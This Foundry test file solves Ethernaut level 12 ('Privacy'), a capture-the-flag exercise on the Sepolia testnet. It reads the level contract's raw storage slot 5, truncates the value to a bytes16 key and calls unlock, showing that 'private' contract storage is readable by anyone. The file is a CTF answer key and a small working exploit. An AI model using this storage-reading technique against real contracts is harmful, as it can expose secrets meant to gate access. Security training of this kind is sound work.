// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/Vm.sol";
import "../src/levels/12-Privacy/Privacy.sol";

contract ContractTest is Test {
    Privacy level12 = Privacy(0x44b46145F1BE962580c628701A6910cf54d10c4E);

    function setUp() public {
        Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
        vm.createSelectFork(vm.rpcUrl("sepolia"));

        vm.label(address(this), "Attacker");
        vm.label(
            address(0x44b46145F1BE962580c628701A6910cf54d10c4E),
            "Ethernaut12"
        );
    }

    function testEthernaut12() public {
        bytes32 slot5Data = vm.load(address(level12), bytes32(uint256(5)));
        bytes16 key = bytes16(slot5Data);

        level12.unlock(key);

        assertEq(level12.locked(), false);
    }

    receive() external payable {}
}
